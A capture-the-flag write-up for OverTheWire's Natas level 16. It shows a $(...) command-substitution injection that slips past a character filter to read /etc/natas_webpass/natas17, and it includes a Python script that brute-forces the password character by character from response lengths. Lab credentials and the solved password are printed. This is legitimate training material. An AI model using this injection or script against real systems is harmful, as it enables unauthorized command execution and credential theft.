🔐 **Level 16**

When accessing the website, we see a short message:  
![message](https://github.com/user-attachments/assets/e76a0c2f-161f-4174-b26b-aecd2bbb6616)

Clicking on **view source code** 📝 shows:  
<img width="1379" height="911" alt="image" src="https://github.com/user-attachments/assets/627548e0-3c2e-4d07-8a5f-294fb2f60f3d" />

It looks similar to previous challenges, but this time the command has been modified into:  
`grep -i "$key" dictionary.txt`  

Here, the `$key` is wrapped in **double quotes** and there is also a filter to block special characters ❌, so we cannot inject payloads the old way.  
👉 However, we can still use the `$(command)` format, which executes inside the quotes before the outer command.  

For example, trying:  
`$(grep ^a /etc/natas_webpass/natas17)pro`  
![grep test](https://github.com/user-attachments/assets/3bf976b8-1ed9-4ae3-a422-aeadbbb924cd)  

Since no password line starts with `a`, the inner `grep` returns nothing, and the outer `grep` just looks for `"pro"`.  

🔎 Using Burp Suite Intruder to brute-force, I noticed response length differences. So I wrote a Python script to automate brute-forcing:  

```python
import requests
import string

url = "http://natas16.natas.labs.overthewire.org"
auth = ('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')

charset = string.ascii_letters + string.digits
password = ""

for i in range(1, 33):
    for char in charset:
        payload = f"$(grep ^{password+char} /etc/natas_webpass/natas17)chicken"
        response = requests.get(url, auth=auth, params={"needle": payload})
        if int(len(response.text)) != 1153:
            password += char
            print(f"[+] Found char {i}: {char} → {password}")
            break

print(f"[✅] Full password for natas17: {password}")
```

Running this script 🔥 revealed the password:
✨ Final Password for Natas17:
```
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```
